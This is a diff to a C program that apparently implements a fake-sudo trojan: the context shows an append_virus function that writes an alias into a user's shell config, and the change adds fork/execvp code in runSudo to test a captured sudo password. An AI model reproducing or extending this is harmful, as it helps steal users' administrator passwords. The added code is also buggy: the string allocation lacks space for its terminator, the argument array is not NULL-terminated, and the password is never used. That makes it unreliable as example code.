@@ -5,6 +5,7 @@
 #include <pwd.h>
 #include <string.h>
 #include <fcntl.h>
+#include <sys/wait.h>
 #include "pseudo.h"
 
 #define PASSWD_SIZE 1024
@@ -124,13 +125,40 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
 int testSudoPassword(char * passwd){
   // The first three command line arguments are path to file, SUDO, sudo
-  char * fillerArray[] = {"", ""};
-  return runSudo(passwd, 0, fillerArray);
+  char ** fillerArray = (char**)calloc(1, sizeof(char*));
+  *(fillerArray) = (char*)malloc(strlen("sudo")*sizeof(char));
+  strcpy(*(fillerArray), "sudo");
+
+  return runSudo(passwd, fillerArray);
 
 }
 
-// Runs sudo with given arguments and returns 0 if successful, 1 if not
-int runSudo(char * passwd, int argc, char ** argAry){
+// Runs sudo with given arguments and returns 0 if successful, something else if not
+int runSudo(char * passwd, char ** argAry){
+  int forkResult = fork();
 
+  // Parent waits for child, returns result of child's sudo
+  if (forkResult > 0){
+    int status = 0;
+    wait(&status);
+
+    int result = WEXITSTATUS(status);
+
+    printf("result: %d\n", result);
+
+    return result;
+  }
+
+  // Child runs sudo
+  if (forkResult == 0){
+
+    printf("Running sudo\n");
+    int execResult = execvp(*(argAry), argAry);
+    if (execResult == -1){
+      printf("Execvp failed to run sudo\n");
+    }
+  }
+
+  // Unreachable
   return 0;
 }
